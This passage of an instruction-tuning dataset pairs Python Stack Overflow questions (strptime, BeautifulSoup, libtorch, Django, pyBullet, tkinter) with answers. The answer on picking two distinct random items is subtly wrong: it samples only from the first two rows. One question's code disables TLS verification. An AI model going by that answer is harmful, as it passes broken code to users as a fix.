&quot;C:\\Users\\Nino\\AppData\\Local\\Programs\\Python\\Python37\\lib\\_strptime.py&quot;, line 359, in _strptime\n    (data_string, format))\nValueError: time data '18\/02\/2020 20:14:31' does not match format '%d\/%m\/%y %H:%M:%S'\n<\/code><\/pre>\n<p>I don't understand as '18\/02\/2020 20:14:31' corresponding perfectly to format '%d\/%m\/%y %H:%M:%S'<\/p>\n<p>What is wrong in my code? Did I miss something?<\/p>","output_text":"<p>You date format should be<\/p>\n<pre><code>from datetime import datetime\ndatetime.strptime(date, '%d\/%m\/%Y %H:%M:%S')\n<\/code><\/pre>\n<p>(with Y in upper case)<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to use find_all() to scrape dictionary website?<p>So I'm having a weird problem. I'm using <code>BeautifulSoup<\/code> to scrape dictionary websites for definitions and their parts of speech and they have to be scraped in the right order so the correct part of speech goes with the correct definition.<\/p>\n<p>For example, for 'ape' the definition 'A large primate' has to go with noun and 'mimic' has to go with verb. For Merriam Webster's site I used:<\/p>\n<pre><code>import requests\nfrom bs4 import BeautifulSoup as bs\n\nurl = 'https:\/\/www.merriam-webster.com\/dictionary\/'\nword = 'ape'\n\nresults = requests.get(url + word)\nsrc = results.content\nsoup = bs(src, 'lxml')\n\ntext = soup.find_all(class_= ['num', 'letter', 'dtText', 'sdsense', 'important-blue-link'])\n\nfor tag in text:\n    print(tag.text.strip())\n<\/code><\/pre>\n<p>This worked great. For each div with class = 'num', 'letter', etc... it stripped the correct elements and then <code>print(tag.text.strip())<\/code> returned the text inside.<\/p>\n<p>Unfortunately, MW's formatting is a nightmare (notice there are way more class tags than just part of speech and definition) and the definitions are wordier than what I'm looking for, so I went to dictionary.com. Dictionary.com has way simpler formatting and better definitions for my purposes, so I was happy. The problem happens when I try to pass multiple classes into the find_all function. If I run:<\/p>\n<pre><code>import requests\nfrom bs4 import BeautifulSoup as bs\n\nurl = 'https:\/\/www.dictionary.com\/browse\/'\nword = 'ape'\n\nresults = requests.get(url + word, verify = False)\nsrc = results.content\nsoup = bs(src, 'lxml')\n\ntext = soup.find_all(class_ = 'one-click-content css-nnyc96 e1q3nk1v1')\n\nfor tag in text:\n    print(tag.text.strip())\n<\/code><\/pre>\n<p>I get all the definitions fine, and if I run the same code with<\/p>\n<pre><code>text = soup.find_all(class_ = 'luna-pos')\n<\/code><\/pre>\n<p>I get all the parts of speech fine, but if I run the code with<\/p>\n<pre><code>text = soup.find_all(class_ = ['luna-pos','one-click-content css-nnyc96 e1q3nk1v1'])\n<\/code><\/pre>\n<p>it returns the text variable as just an empty list. I don't understand why this format for entering multiple tags into the <code>find_all()<\/code> function works for one website, but not the other. The only thing I can think is <code>requests.get()<\/code> isn't finding dictionary.com's certificates, so I entered verify = False and it returns a little warning, but I can't think why that would affect the <code>find_all()<\/code> function.<\/p>","output_text":"<p>Not sure why there is a need to combine these two parts, but you can get your goal with:<\/p>\n<pre><code>soup.find_all(class_ = ['luna-pos','one-click-content'])\n<\/code><\/pre>\n<p>or<\/p>\n<pre><code>soup.select('.luna-pos,.one-click-content')\n<\/code><\/pre>\n<p>Just in case - Getting a separated and more structured output you should change strategy selecting your elements:<\/p>\n<pre><code>data = []\nfor e in soup.select('#top-definitions-section ~ section'):\n    data.append({\n        'pos':e.select_one('.luna-pos').text,\n        'definition':[t.get_text(strip=True) for t in e.select('div[value]')]\n    })\n\ndata\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>[{'pos': 'noun',\n  'definition': ['Anthropology,Zoology.any member of the superfamily Hominoidea, the two extant branches of which are the lesser apes (gibbons) and the great apes (humans, chimpanzees, gorillas, and orangutans).See alsocatarrhine.',\n   '(loosely) any primate except humans.',\n   'an imitator;mimic.',\n   'Informal.a big, ugly, clumsy person.',\n   'Disparaging and Offensive.(used as a slur against a member of a racial or ethnic minority group, especially a Black person.)']},\n {'pos': 'verb (used with object),',\n  'definition': [&quot;toimitate;mimic:to ape another's style of writing.&quot;]},\n {'pos': 'adjective',\n  'definition': ['Slang. (usually in the phrasego ape)violently emotional:When she threatened to leave him, he went ape.extremely enthusiastic (often followed byoverorfor):They go ape over old rock music.We were all ape for the new movie trailer.']}]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pytorch C++ (Libtroch), using inter-op parallelism<p>I am working on a machine learning system using the C++ API of PyTorch (<code>libtorch<\/code>).<\/p>\n<p>One thing that I have been recently working on is researching performance, CPU utilization and GPU usage of <code>libtorch<\/code>. Trough my research I understand that Torch utilizes two ways of parallelization on CPUs:<\/p>\n<ul>\n<li><code>inter-op<\/code> parallelization<\/li>\n<li><code>intra-op<\/code> parallelization<\/li>\n<\/ul>\n<p><strong>My main questions are<\/strong>:<\/p>\n<ul>\n<li>difference between these two<\/li>\n<li>how can I utilize <code>inter-op<\/code> parallelism<\/li>\n<\/ul>\n<p>I know that I can specify the number of threads used for <code>intra-op<\/code> parallelism (which from my understanding is performed using the <code>openmp<\/code> backend) using the <code>torch::set_num_threads()<\/code> function, as I monitor the performance of my models, I can see clearly that it utilizes the number of threads I specify using this function, and I can see clear performance difference by changing the number of <code>intra-op<\/code> threads.<\/p>\n<p>There is also another function <code>torch::set_num_interop_threads()<\/code>, but it seems that no matter how many interop threads I specify, I never see any difference in performance.<\/p>\n<p>Now I have read <a href=\"https:\/\/pytorch.org\/docs\/stable\/notes\/cpu_threading_torchscript_inference.html\" rel=\"nofollow noreferrer\">this PyTorch documentation article<\/a> but it is still is unclear to me how to utilize the inter op thread pool.<\/p>\n<p>The docs say:<\/p>\n<blockquote>\n<p>PyTorch uses a single thread pool for the inter-op parallelism, this thread pool is shared by all inference tasks that are forked within the application process.<\/p>\n<\/blockquote>\n<p><strong>I have two questions to this part:<\/strong><\/p>\n<ul>\n<li>do I need to create new threads myself to utilize the <code>interop<\/code> threads, or does torch do it somehow for me internally?<\/li>\n<li>If I need to create new threads myself, how do I do it in C++, so that I create a new thread form the <code>interop<\/code> thread pool?<\/li>\n<\/ul>\n<p>In <code>python<\/code> example they use a <code>fork<\/code> function from <code>torch.jit<\/code> module, but I cant find anything similar in the C++ API.<\/p>","output_text":"<h2 id=\"questions-pitn\">Questions<\/h2>\n<blockquote>\n<p>difference between these two<\/p>\n<\/blockquote>\n<p><a href=\"https:\/\/i.stack.imgur.com\/4IS9Q.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/4IS9Q.png\" alt=\"intra_inter\" \/><\/a><\/p>\n<p>As one can see on this picture:<\/p>\n<ul>\n<li><code>intra-op<\/code> - parallelization done <strong>for single operation<\/strong> (like <code>matmul<\/code> or any other &quot;per-tensor&quot;)<\/li>\n<li><code>inter-op<\/code> - you have multiple operations and their calculations can be intertwined<\/li>\n<\/ul>\n<p><code>inter-op<\/code> &quot;example&quot;:<\/p>\n<ul>\n<li><code>op1<\/code> starts and returns &quot;Future&quot; object (which is an object we can query for result <strong>once this operation finishes<\/strong>)<\/li>\n<li><code>op2<\/code> starts <strong>immediately after<\/strong> (as <code>op1<\/code> is non-blocking right now)<\/li>\n<li><code>op2<\/code> finishes<\/li>\n<li>we can query <code>op1<\/code> for result (hopefully finished already or at least closer to finishing)<\/li>\n<li>we add <code>op1<\/code> and <code>op2<\/code> results together (or whatever we'd like to do with them)<\/li>\n<\/ul>\n<p>Due to above:<\/p>\n<ul>\n<li><code>intra-op<\/code> works without any additions (as it's PyTorch handled) and should improve the performance<\/li>\n<li><code>inter-op<\/code> is user driven (model's architecture, <code>forward<\/code> especially), hence <strong>architecture must be created with <code>inter-op<\/code> in mind!<\/strong><\/li>\n<\/ul>\n<blockquote>\n<p>how can I utilize inter-op parallelism<\/p>\n<\/blockquote>\n<p>Unless you architectured your models with <code>inter-op<\/code> in mind (using for example <code>Futures<\/code>, see first code snippet in the link you posted) you won't see any performance improvements.<\/p>\n<p><strong>Most probably<\/strong>:<\/p>\n<ul>\n<li>Your models are written in Python, converted to <code>torchscript<\/code> and only inference is done in C++<\/li>\n<li>You should write (or refactor existing) <code>inter-op<\/code> code in Python, e.g. using <a href=\"https:\/\/pytorch.org\/docs\/stable\/generated\/torch.jit.fork.html#torch.jit.fork\" rel=\"nofollow noreferrer\"><code>torch.jit.fork<\/code><\/a> and <a href=\"https:\/\/pytorch.org\/docs\/stable\/generated\/torch.jit.wait.html#torch.jit.wait\" rel=\"nofollow noreferrer\"><code>torch.jit.wait<\/code><\/a><\/li>\n<\/ul>\n<blockquote>\n<p>do I need to create new threads myself to utilize the interop threads, or does torch do it somehow for me internally?<\/p>\n<\/blockquote>\n<p>Not sure if it's possible in C++ currently, can't find any <code>torch::jit::fork<\/code> or related functionality.<\/p>\n<blockquote>\n<p>If I need to create new threads myself, how do I do it in C++, so that\nI create a new thread form the interop thread pool?<\/p>\n<\/blockquote>\n<p>Unlikely as C++'s API's goal is to mimick Python's API as close to reality as possible. <strong>You might have to dig a little deeper for source code related to it and\/or post a feature request on their GitHub repo if needed<\/strong><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Customizing model fields by user<p>I am making a CRM, and I ran into one task: I want to make a \u201cClient\u201d model, with all possible fields, and give an opportunity for users to \u201cenable\u201d only those \u201cClient\u201d fields that he needs.<br \/>\nI have little experience and unfortunately I have not been able to find a solution for this for a long time.<br \/>\nI would be grateful if someone can show me an example of how this is done (or a link to a repository with a similar method).<\/p>","output_text":"<p>The answer is JSONField, new DBMSs support JSON Fields natively and Django has a native support from 3.0, so you can add the extra fields as attributes in a JSON and save to the a column called <code>extra<\/code> for example you want to add a field  called 'mobile2' so rather than creating the column, so you can add it to the extra column like this<\/p>\n<pre><code>obj.extra[&quot;mobile2&quot;] = &quot;0xxxxx&quot;\n<\/code><\/pre>\n<p>this allows you to extend quickly and give different attributes per user.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to get depth images from the camera in pyBullet<p>In pyBullet, I have struggled a bit with generating a dataset. What I want to achieve is to get pictures of what the camera is seeing: <code>img = p.getCameraImage(224, 224, renderer=p.ER_BULLET_HARDWARE_OPENGL)<\/code><\/p>\n<p>Basically: to get the images that are seen in Synthetic Camera RGB data and Synthetic Camera <strong>Depth<\/strong> Data (especially this one), which are the camera windows you can see in the following picture on the left.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/eXv2om.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/eXv2om.jpg\" alt=\"Desired Camera Information here\" \/><\/a><\/p>\n<pre><code>        p.resetDebugVisualizerCamera(cameraDistance=0.5, cameraYaw=yaw, cameraPitch=pitch, cameraTargetPosition=[center_x, center_y, 0.785])\n        img = p.getCameraImage(224, 224, renderer=p.ER_BULLET_HARDWARE_OPENGL)\n        rgbBuffer = img[2]\n        depthBuffer = img[3]\n        list_of_rgbs.append(rgbBuffer)\n        list_of_depths.append(depthBuffer)\n\n        rgbim = Image.fromarray(rgbBuffer)\n        depim = Image.fromarray(depthBuffer)\n\n        rgbim.save('test_img\/rgbtest'+str(counter)+'.jpg')\n        depim.save('test_img\/depth'+str(counter)+'.tiff')\n\n       \n        counter += 1\n<\/code><\/pre>\n<p>I already run the following, so I don't know if it is related to the settings.  <code>p.configureDebugVisualizer(p.COV_ENABLE_DEPTH_BUFFER_PREVIEW, 1)<\/code><br \/>\nI have tried several methods because the depth part is complicated. I don't understand if it needs to be treated separately because of the pixel color information or if I need to work with the <code>project matrixes<\/code> and <code>view matrixes<\/code>.\nI need to save it as a <code>.tiff<\/code> because I get some <code>cannot save F to png<\/code> errors. I tried playing a bit with the bit information but acomplished nothing. In case you asked,<\/p>\n<pre><code># depthBuffer[depthBuffer &gt; 65535] = 65535\n# im_uint16 = np.round(depthBuffer).astype(np.uint16)\n# depthBuffer = im_uint16 \n<\/code><\/pre>\n<p>The following is an example of the the <code>.tiff<\/code> image<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/sXSoQ.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/sXSoQ.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>And to end, just to remark that these depth images keep changing (looking at all of them, then to the RGB and passing again to the depth images, shows different images regardless of being the same image. I have never ever seen something like this before.<\/p>","output_text":"<p>I thought &quot;I managed to fix this some time ago, might as well post the answer found&quot;.<\/p>\n<p>The data structure of <code>img<\/code> has to be taken into account!<\/p>\n<pre><code>    img = p.getCameraImage(224, 224, shadow = False, renderer=p.ER_BULLET_HARDWARE_OPENGL)\n    rgb_opengl = (np.reshape(img[2], (IMG_SIZE, IMG_SIZE, 4)))\n    depth_buffer_opengl = np.reshape(img[3], [IMG_SIZE, IMG_SIZE])\n    depth_opengl = far * near \/ (far - (far - near) * depth_buffer_opengl)\n    seg_opengl = np.reshape(img[4], [IMG_SIZE, IMG_SIZE]) * 1. \/ 255.\n\n    rgbim = Image.fromarray(rgb_opengl)\n    rgbim_no_alpha = rgbim.convert('RGB')\n\n    rgbim_no_alpha.save('dataset\/'+obj_name+'\/'+ obj_name +'_rgb_'+str(counter)+'.jpg')\n    # plt.imshow(depth_buffer_opengl)\n    plt.imsave('dataset\/'+obj_name+'\/'+ obj_name+'_depth_'+str(counter)+'.jpg', depth_buffer_opengl)\n    # plt.show()\n<\/code><\/pre>\n<p>Final Images:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/KDZLu.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/KDZLu.jpg\" alt=\"enter image description here\" \/><\/a><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/H32QA.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/H32QA.jpg\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why isn't this timing of program right?<pre><code>start = time.time()\n\nprocess_file(builder_configs.data_directory_id)\n\nend = time.time()\n\nprint(\"Time spent: \", str(timedelta(minutes=(end - start))))\n<\/code><\/pre>\n\n<p>At the end of the running the program, it shows:<\/p>\n\n<pre><code>Time spent:  1 day, 12:12:41.348290\n<\/code><\/pre>\n\n<p>This is totally wrong. It runs and ended within at most 1 hour, but it shows 1 day? How to interpret this?<\/p>","output_text":"<p>As Miloslaw Smyk commented, you want to set the seconds, not the minutes because <code>time.time()<\/code> measures seconds.  You can fix this by replacing the last line with this:<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>print(\"Time spent: \", str(timedelta(seconds=(end - start))))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to make sure 2 numbers are not duplicated<p>Is there any way to make sure that my 2 randomly generated items will not be the same? For my current code, sometimes <code>number1<\/code> will be the same as <code>number2<\/code>.<\/p>\n<pre><code>import random\n\ncar_list = [['Toyota', 8], ['Merc', 8], ['BMW', 8], ['Porshe', 8], ['RR', 8]]\nnumber1 = random.choice(car_list)\nnumber2 = random.choice(car_list)\n\nprint(number1)\nprint(number2)\n<\/code><\/pre>","output_text":"<p>you can use this :<\/p>\n<pre><code>#Syntax : numpy.random.choice(a, size=None, replace=True, p=None)\n\nimport numpy as np\n\narray = np.array([['Toyota', 8], ['Merc', 8], ['BMW', 8], ['Porshe', 8], ['RR', 8]])\n# print(&quot;Printing 2D Array&quot;)\n# print(array)\n\nprint(&quot;Choose 2 sample rows from 2D array&quot;)\nrandomRows = np.random.choice(2, size=2,replace=False)\nfor i in randomRows:\n    print(array[i, :])\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>Choose 2 sample rows from 2D array\n['Toyota' '8']\n['Merc' '8']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why is the image not showing in the tkinter using if conditions?<pre><code>    from tkinter import *\nfrom tkinter import ttk\nfrom PIL import ImageTk ,Image\n\nwin=tkinter.Toplevel()\n\nwrapper=Frame(win, bd=4, relief=RIDGE, bg=&quot;crimson&quot;)\nwrapper.place(x=0, y=80, width=465, height=625)\nwrapper3=Frame(win, bd=4, relief=RIDGE, bg=&quot;crimson&quot;)\nwrapper3.place(x=950, y=80, width=465, height=625) \nwrapper3_title=Label(wrapper3, text=&quot;Selected Data&quot;, bg=&quot;crimson&quot;, fg=&quot;white&quot;, font=(&quot;times new roman&quot;,30,&quot;bold&quot;))\nwrapper3_title.grid(row=0,column=0,padx=20, pady=10)\nwrapper2=Frame(win, bd=4, relief=RIDGE, bg=&quot;crimson&quot;)\nwrapper2.place(x=465, y=80, width=485, height=625) \n\nent8=StringVar()\n\n\ndef code():\n    btn1.destroy()\n    add=StringVar()\n    sub=StringVar()\n    pro=StringVar()\n\n    img=ImageTk.PhotoImage(Image.open(&quot;Amritsar.jpg&quot;))\n    Label2= Label(wrapper2, image=img)\n    Label2.grid(row=0, column=0, padx=10, pady=5, sticky='w')\n\n    def Find():\n        add.set(float(ent00.get())+float(ent01.get()))\n        sub.set(float(ent00.get())-float(ent01.get()))\n        pro.set(float(ent00.get())*float(ent01.get()))\n\n    ent00=Entry(wrapper, width=15)\n    ent00.grid(row=4, column=1, padx=10, pady=10, sticky='w')\n    ent01=Entry(wrapper, width=15)\n    ent01.grid(row=5, column=1, padx=10, pady=10, sticky='w')\n\n    lbl8=Label(wrapper, text=&quot;Add&quot;, bg=&quot;crimson&quot;, fg=&quot;white&quot;, font=(&quot;times new roman&quot;,15,&quot;bold&quot;)).grid(row=6, column=0, padx=20, pady=10, sticky='w')\n    ent8=Entry(wrapper, textvariable=add, width=15, state='readonly')\n    ent8.grid(row=6, column=1, padx=10, pady=10, sticky='w')\n\n    lbl15=Label(wrapper, text=&quot;Subtract&quot;, bg=&quot;crimson&quot;, fg=&quot;white&quot;, font=(&quot;times new roman&quot;,15,&quot;bold&quot;)).grid(row=7, column=0, padx=20, pady=10, sticky='w')\n    ent15=Entry(wrapper, textvariable=sub, width=15, state='readonly')\n    ent15.grid(row=7, column=1, padx=10, pady=10, sticky='w')\n\n    lbl9=Label(wrapper, text=&quot;Product&quot;, bg=&quot;crimson&quot;, fg=&quot;white&quot;, font=(&quot;times new roman&quot;,15,&quot;bold&quot;)).grid(row=8, column=0, padx=20, pady=10, sticky='w')\n    ent9=Entry(wrapper, textvariable=pro, width=15, state='readonly')\n    ent9.grid(row=8, column=1, padx=10, pady=10, sticky='w')\n\n    btn = Button(wrapper, text = 'Calculate', command=Find, bd = '5', width=15, height=2)\n    btn.grid(row=11, column=1, padx=20, pady=10)\n\ndef img():  \n    if ent8.get()==&quot;4&quot;:\n        img=ImageTk.PhotoImage(Image.open(&quot;Amritsar.jpg&quot;))\n        Label2= Label(wrapper3, image=img)\n        Label2.grid(row=0, column=2, padx=10, pady=5, sticky='w')\n        print(&quot;Move ahead&quot;)\n    else:\n        print(&quot;Try again&quot;)\n\nbtn2 = Button(wrapper, text = 'Image', command=img, bd = '5', width=15, height=2)\nbtn2.grid(row=12, column=1, padx=20, pady=10)        \n\nbtn1 = Button(wrapper, text = 'OPEN CODE', command=code, bd = '5', width=20, height=2)\nbtn1.grid(row=11, column=1, padx=20, pady=10)\n\nwin.geometry(&quot;1400x700+250+250&quot;)\nwin.mainloop()\n<\/code><\/pre>\n<p>Two images need to be shown on the tkinter. The one defined earlier in wrapper2, shows empty frame while the one that has to appear in wrapper3 after getting 4 as sum, does not appear at all. Moreover, the output printed is &quot;Try again&quot;. Why it is so? When sum is 4 it has to show &quot;Move ahead&quot;.<a href=\"https:\/\/i.stack.imgur.com\/e13dM.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/e13dM.png\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>First of all, terrible names.<br \/>\nBoth your function and your <code>PhotoImage<\/code> are named <code>img<\/code>. Rename the function to <code>def add_img()<\/code>.\nSecond, looking at your code I have no idea what all the wrapper frames are for, why not name them according to what they are planned to hold? Same applies to all the widgets. Wouldn't <code>calc_btn<\/code> be a better name than <code>btn<\/code>? <code>img_btn<\/code> instead of <code>btn2<\/code>? Why do you need to read more than the name to know what something is?<\/p>\n<p>Third, you have ent8 twice in your code. Once as Label and again as a StringVar.<\/p>\n<p>Tkinter constantly refreshes your window so you need to save the image you are using.<br \/>\nPersonally I would have done all of this in a class.<\/p>\n<p>For right now, with your current code, just add<br \/>\n<code>loaded_img = ImageTk.PhotoImage(Image.open(&quot;Amritsar.jpg&quot;))<\/code> before your functions and instead of using the variables you are using to open the image, just use <code>Label(wrapper3, image=loaded_img)<\/code><\/p>\n<p>As in:<\/p>\n<pre><code>win = Toplevel()\n\nwrapper=Frame(win, bd=4, relief=RIDGE, bg=&quot;crimson&quot;)\nwrapper.place(x=0, y=80, width=465, height=625)\nwrapper3=Frame(win, bd=4, relief=RIDGE, bg=&quot;crimson&quot;)\nwrapper3.place(x=950, y=80, width=465, height=625)\nwrapper3_title=Label(wrapper3, text=&quot;Selected Data&quot;, bg=&quot;crimson&quot;, fg=&quot;white&quot;, font=(&quot;times new roman&quot;,30,&quot;bold&quot;))\nwrapper3_title.grid(row=0,column=0,padx=20, pady=10)\nwrapper2=Frame(win, bd=4, relief=RIDGE, bg=&quot;crimson&quot;)\nwrapper2.place(x=465, y=80, width=485, height=625)\n\nent8=StringVar()\n\nloaded_img = ImageTk.PhotoImage(Image.open(&quot;Amritsar.jpg&quot;))\n<\/code><\/pre>\n<p><strong>Edit<\/strong><br \/>\nHere is the entire code:<\/p>\n<pre><code>from tkinter import *\nfrom tkinter import ttk\nfrom PIL import ImageTk ,Image\n\nwin=Toplevel()\n\nwrapper=Frame(win, bd=4, relief=RIDGE, bg=&quot;crimson&quot;)\nwrapper.place(x=0, y=80, width=465, height=625)\nwrapper3=Frame(win, bd=4, relief=RIDGE, bg=&quot;crimson&quot;)\nwrapper3.place(x=950, y=80, width=465, height=625)\nwrapper3_title=Label(wrapper3, text=&quot;Selected Data&quot;, bg=&quot;crimson&quot;, fg=&quot;white&quot;, font=(&quot;times new roman&quot;,30,&quot;bold&quot;))\nwrapper3_title.grid(row=0,column=0,padx=20, pady=10)\nwrapper2=Frame(win, bd=4, relief=RIDGE, bg=&quot;crimson&quot;)\nwrapper2.place(x=465, y=80, width=485, height=625)\n\nent8=StringVar()\n\nloaded_img = ImageTk.PhotoImage(Image.open(&quot;Amritsar.jpg&quot;))\nadd_strvar = StringVar()\nsub_strvar = StringVar()\npro_strvar = StringVar()\n\ndef code():\n    btn1.destroy()\n\n    Label2= Label(wrapper2, image=loaded_img)\n    Label2.grid(row=0, column=0, padx=10, pady=5, sticky='w')\n\n    def Find():\n        add_strvar.set(float(ent00.get())+float(ent01.get()))\n        sub_strvar.set(float(ent00.get())-float(ent01.get()))\n        pro_strvar.set(float(ent00.get())*float(ent01.get()))\n\n    ent00=Entry(wrapper, width=15)\n    ent00.grid(row=4, column=1, padx=10, pady=10, sticky='w')\n    ent01=Entry(wrapper, width=15)\n    ent01.grid(row=5, column=1, padx=10, pady=10, sticky='w')\n\n    lbl8=Label(wrapper, text=&quot;Add&quot;, bg=&quot;crimson&quot;, fg=&quot;white&quot;, font=(&quot;times new roman&quot;,15,&quot;bold&quot;)).grid(row=6, column=0, padx=20, pady=10, sticky='w')\n    ent8=Entry(wrapper, textvariable=add_strvar, width=15, state='readonly')\n    ent8.grid(row=6, column=1, padx=10, pady=10, sticky='w')\n\n    lbl15=Label(wrapper, text=&quot;Subtract&quot;, bg=&quot;crimson&quot;, fg=&quot;white&quot;, font=(&quot;times new roman&quot;,15,&quot;bold&quot;)).grid(row=7, column=0, padx=20, pady=10, sticky='w')\n    ent15=Entry(wrapper, textvariable=sub_strvar, width=15, state='readonly')\n    ent15.grid(row=7, column=1, padx=10, pady=10, sticky='w')\n\n    lbl9=Label(wrapper, text=&quot;Product&quot;, bg=&quot;crimson&quot;, fg=&quot;white&quot;, font=(&quot;times new roman&quot;,15,&quot;bold&quot;)).grid(row=8, column=0, padx=20, pady=10, sticky='w')\n    ent9=Entry(wrapper, textvariable=pro_strvar, width=15, state='readonly')\n    ent9.grid(row=8, column=1, padx=10, pady=10, sticky='w')\n\n    btn = Button(wrapper, text = 'Calculate', command=Find, bd = '5', width=15, height=2)\n    btn.grid(row=11, column=1, padx=20, pady=10)\n\n\ndef add_img():\n    if add_strvar.get() == &quot;4.0&quot;:\n        Label2= Label(wrapper3, image=loaded_img)\n        Label2.grid(row=0, column=2, padx=10, pady=5, sticky='w')\n        print(&quot;Move ahead&quot;)\n    else:\n        print(&quot;Try again&quot;)\n\nbtn2 = Button(wrapper, text = 'Image', command=add_img, bd = '5', width=15, height=2)\nbtn2.grid(row=12, column=1, padx=20, pady=10)\n\nbtn1 = Button(wrapper, text = 'OPEN CODE', command=code, bd = '5', width=20, height=2)\nbtn1.grid(row=11, column=1, padx=20, pady=10)\n\nwin.geometry(&quot;1400x700+250+250&quot;)\nwin.mainloop()\n<\/code><\/pre>\n<p><strong>Edit 2<\/strong><br \/>\nCode changed to work with classes:<\/p>\n<pre><code>from tkinter import *\nfrom tkinter import ttk\nfrom PIL import ImageTk ,Image\n\n\nclass ImageCalculator:\n    def __init__(self, img_path):\n        self.window = Toplevel()\n        self.window.geometry(&quot;1400x700+250+250&quot;)\n        self.mainframe = Frame(self.window)\n        self.mainframe.pack(expand=True, fill=BOTH)\n        self.bg_color = 'crimson'\n\n        frame_settings = {'master': self.mainframe, 'bd': 4,\n                          'relief': RIDGE, 'bg': self.bg_color}\n        frame_names = ('left', 'center', 'right')\n        self.frames = {name: Frame(**frame_settings) for name in frame_names}\n\n        frame_height = 625\n        init_y = 80\n        frame_widths = {'left': 465, 'center': 485, 'right': 465}\n        x = 0\n        for name in frame_names:\n            frame_width = frame_widths[name]\n            self.frames[name].place(x=x, y=init_y, width=frame_width,\n                                    height=frame_height)\n            x += frame_width\n        self.setup_right_wrapper()\n        self.code_btn = self.setup_left_wrapper()\n\n        self.loaded_image = ImageTk.PhotoImage(Image.open(img_path))\n\n        self.add_strvar = StringVar()\n        self.sub_strvar = StringVar()\n        self.pro_strvar = StringVar()\n\n    def setup_left_wrapper(self) -&gt; Button:\n        code_btn = Button(self.frames['left'], text='OPEN CODE', command=self.code,\n                          bd='5', width=20, height=2)\n        img_btn = Button(self.frames['left'], text='Image', bd='5', width=15,\n                         height=2, command=self.add_img)\n\n        code_btn.grid(row=11, column=1, padx=20, pady=10)\n        img_btn.grid(row=12, column=1, padx=20, pady=10)\n\n        return code_btn\n\n    def setup_right_wrapper(self):\n        right_frame_title = Label(self.frames['right'], text=&quot;Selected Data&quot;,\n                                  bg=self.bg_color, fg=&quot;white&quot;,\n                                  font=(&quot;times new roman&quot;,30,&quot;bold&quot;))\n        right_frame_title.grid(row=0, column=0, padx=20, pady=10)\n\n    def code(self):\n        def Find():\n            self.add_strvar.set(float(first_entry.get())\n                                + float(second_entry.get()))\n            self.sub_strvar.set(float(first_entry.get())\n                                - float(second_entry.get()))\n            self.pro_strvar.set(float(first_entry.get())\n                                * float(second_entry.get()))\n\n        self.code_btn.destroy()\n\n        Label2 = Label(self.frames['center'], image=self.loaded_image)\n        Label2.grid(row=0, column=0, padx=10, pady=5, sticky='w')\n\n        left_frame = self.frames['left']\n        first_entry = Entry(left_frame, width=15)\n        second_entry = Entry(left_frame, width=15)\n\n        # Settings of all labels\n        lbl_settings = {'bg': self.bg_color, 'fg': 'white',\n                        'font': (&quot;times new roman&quot;, 15, &quot;bold&quot;)}\n        # Setting of all entry.\n        entry_settings = {'width': 15, 'state': 'readonly'}\n\n        add_lbl = Label(left_frame, text=&quot;Add&quot;, **lbl_settings)\n        add_entry = Entry(left_frame, textvariable=self.add_strvar,\n                          **entry_settings)\n\n        sub_lbl = Label(left_frame, text=&quot;Subtract&quot;, **lbl_settings)\n        sub_entry = Entry(left_frame, textvariable=self.sub_strvar,\n                          **entry_settings)\n\n        pro_lbl = Label(left_frame, text=&quot;Product&quot;, **lbl_settings)\n        pro_entry = Entry(left_frame, textvariable=self.pro_strvar,\n                          **entry_settings)\n\n        calc_btn = Button(left_frame, text='Calculate', command=Find, bd='5',\n                          width=15, height=2)\n\n        # Widget placement.\n        first_entry.grid(row=4, column=1, padx=10, pady=10, sticky='w')\n        second_entry.grid(row=5, column=1, padx=10, pady=10, sticky='w')\n        add_lbl.grid(row=6, column=0, padx=20, pady=10, sticky='w')\n        add_entry.grid(row=6, column=1, padx=10, pady=10, sticky='w')\n        sub_lbl.grid(row=7, column=0, padx=20, pady=10, sticky='w')\n        sub_entry.grid(row=7, column=1, padx=10, pady=10, sticky='w')\n        pro_lbl.grid(row=8, column=0, padx=20, pady=10, sticky='w')\n        pro_entry.grid(row=8, column=1, padx=10, pady=10, sticky='w')\n        calc_btn.grid(row=11, column=1, padx=20, pady=10)\n\n    def add_img(self):\n        if self.add_strvar.get() == &quot;4.0&quot;:\n            Label2 = Label(self.frames['right'], image=self.loaded_image)\n            Label2.grid(row=0, column=2, padx=10, pady=5, sticky='w')\n            print(&quot;Move ahead&quot;)\n        else:\n            print(&quot;Try again&quot;)\n\n\ndef main():\n    img_calc = ImageCalculator('Amritsar.jpg')\n\n    mainloop()\n\n\nif __name__ == &quot;__main__&quot;:\n    